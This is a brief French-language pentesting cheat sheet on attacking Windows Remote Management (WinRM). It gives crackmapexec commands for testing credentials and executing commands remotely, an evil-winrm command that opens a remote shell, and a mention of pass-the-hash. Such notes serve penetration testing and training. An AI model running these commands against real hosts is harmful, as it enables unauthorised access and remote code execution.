Introduction

Winrm est un protocole permettant de faire de la gestion à distance. Il repose sur le port 5985 en HTTP et 5986 en HTTPS.

Crackmapexec

Via le module Winrm de crackmapexec on peut vérifier des couples user/password et faire une RCE.

sudo crackmapexec winrm -u <user> -p <password> -d <domain> <host/Ip> -x command

Il est aussi possible d’invoquer des shells via des modules.

Evil-winrm

Evil Winrm permet d’obtenir un shell

./evil-winrm.rb -i <ip> -u <user> -p <pass>

Avec l’option -H on peut aussi faire une attaque Pass The Hash
